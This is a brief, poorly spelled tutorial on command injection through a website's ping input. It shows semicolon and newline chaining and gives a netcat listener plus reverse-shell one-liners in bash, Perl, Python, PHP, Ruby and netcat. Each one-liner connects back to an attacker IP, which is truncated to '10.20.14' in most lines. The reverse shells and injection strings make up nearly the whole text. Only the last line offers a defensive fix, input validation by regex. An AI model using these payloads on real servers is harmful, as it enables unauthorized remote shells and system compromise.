For example, a site offer you a ping service as input you need to put the desigred ip.
So if you type 10.20.30.40, The server will go to his terminal and execute, ping 10.20.30.40.
For example lets assume the server is linux, we can use ";" to write a new line.

That means that you might be able to run any command on the server.
So we will try that by the next command

ping 192.168.1.1; pwd
ping IP;COMMANDS

And if out server was windows,

ping 192.168.1.1\nipconfig
ping IP\n COMMAND

If it does works it means this is code execution vulner.
For each program language we hav to use diffrent piece of code, 

The following examples assums the hacker IP is 10.20.14 and use port 8080 for the connection.
Therefore in all f these cases you need to listen for port 8080 using the foolowing command
nc -vv -l -p 8080

BASH
bash -i >& /dev/tcp/10.20.14.203/8080 0>&1

PERL
perl -e 'use Socket;$i="10.20.14";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.20.14",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

PHP
php -r '$sock=fsockopen("10.20.14",8080);exec("/bin/sh -i <&3 >&3 2>&3");'

Ruby
ruby -rsocket -e'f=TCPSocket.open("10.20.14",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

Netcat
nc -e /bin/sh 10.20.14 8080






SOLOUTION:

use regex rule to make sure the input looks like it suppose to. you can aslo make sure there is no semicolon or spaces
